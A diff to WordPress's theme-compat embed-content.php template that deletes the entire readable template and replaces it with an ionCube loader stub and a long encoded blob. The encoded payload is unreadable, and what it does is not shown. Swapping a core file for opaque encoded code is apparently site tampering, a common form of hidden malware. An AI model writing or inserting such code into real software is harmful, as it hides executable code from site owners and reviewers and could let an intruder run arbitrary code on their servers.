@@ -1,126 +1,101 @@
-<?php
-/**
- * Contains the post embed content template part
- *
- * When a post is embedded in an iframe, this file is used to create the content template part
- * output if the active theme does not include an embed-content.php template.
- *
- * @package WordPress
- * @subpackage Theme_Compat
- * @since 4.5.0
- */
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
-	<div <?php post_class( 'wp-embed' ); ?>>
-		<?php
-		$thumbnail_id = 0;
-
-		if ( has_post_thumbnail() ) {
-			$thumbnail_id = get_post_thumbnail_id();
-		}
-
-		if ( 'attachment' === get_post_type() && wp_attachment_is_image() ) {
-			$thumbnail_id = get_the_ID();
-		}
-
-		/**
-		 * Filters the thumbnail image ID for use in the embed template.
-		 *
-		 * @since 4.9.0
-		 *
-		 * @param int $thumbnail_id Attachment ID.
-		 */
-		$thumbnail_id = apply_filters( 'embed_thumbnail_id', $thumbnail_id );
-
-		if ( $thumbnail_id ) {
-			$aspect_ratio = 1;
-			$measurements = array( 1, 1 );
-			$image_size   = 'full'; // Fallback.
-
-			$meta = wp_get_attachment_metadata( $thumbnail_id );
-			if ( ! empty( $meta['sizes'] ) ) {
-				foreach ( $meta['sizes'] as $size => $data ) {
-					if ( $data['height'] > 0 && $data['width'] / $data['height'] > $aspect_ratio ) {
-						$aspect_ratio = $data['width'] / $data['height'];
-						$measurements = array( $data['width'], $data['height'] );
-						$image_size   = $size;
-					}
-				}
-			}
-
-			/**
-			 * Filters the thumbnail image size for use in the embed template.
-			 *
-			 * @since 4.4.0
-			 * @since 4.5.0 Added `$thumbnail_id` parameter.
-			 *
-			 * @param string $image_size   Thumbnail image size.
-			 * @param int    $thumbnail_id Attachment ID.
-			 */
-			$image_size = apply_filters( 'embed_thumbnail_image_size', $image_size, $thumbnail_id );
-
-			$shape = $measurements[0] / $measurements[1] >= 1.75 ? 'rectangular' : 'square';
-
-			/**
-			 * Filters the thumbnail shape for use in the embed template.
-			 *
-			 * Rectangular images are shown above the title while square images
-			 * are shown next to the content.
-			 *
-			 * @since 4.4.0
-			 * @since 4.5.0 Added `$thumbnail_id` parameter.
-			 *
-			 * @param string $shape        Thumbnail image shape. Either 'rectangular' or 'square'.
-			 * @param int    $thumbnail_id Attachment ID.
-			 */
-			$shape = apply_filters( 'embed_thumbnail_image_shape', $shape, $thumbnail_id );
-		}
-
-		if ( $thumbnail_id && 'rectangular' === $shape ) : ?>
-			<div class="wp-embed-featured-image rectangular">
-				<a href="<?php the_permalink(); ?>" target="_top">
-					<?php echo wp_get_attachment_image( $thumbnail_id, $image_size ); ?>
-				</a>
-			</div>
-		<?php endif; ?>
-
-		<p class="wp-embed-heading">
-			<a href="<?php the_permalink(); ?>" target="_top">
-				<?php the_title(); ?>
-			</a>
-		</p>
-
-		<?php if ( $thumbnail_id && 'square' === $shape ) : ?>
-			<div class="wp-embed-featured-image square">
-				<a href="<?php the_permalink(); ?>" target="_top">
-					<?php echo wp_get_attachment_image( $thumbnail_id, $image_size ); ?>
-				</a>
-			</div>
-		<?php endif; ?>
-
-		<div class="wp-embed-excerpt"><?php the_excerpt_embed(); ?></div>
-
-		<?php
-		/**
-		 * Prints additional content after the embed excerpt.
-		 *
-		 * @since 4.4.0
-		 */
-		do_action( 'embed_content' );
-		?>
-
-		<div class="wp-embed-footer">
-			<?php the_embed_site_title() ?>
-
-			<div class="wp-embed-meta">
-				<?php
-				/**
-				 * Prints additional meta content in the embed template.
-				 *
-				 * @since 4.4.0
-				 */
-				do_action( 'embed_content_meta');
-				?>
-			</div>
-		</div>
-	</div>
-<?php
+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
+UG5iUQqWFdFlUKPOav2hYSETA3Agbr/bgG==
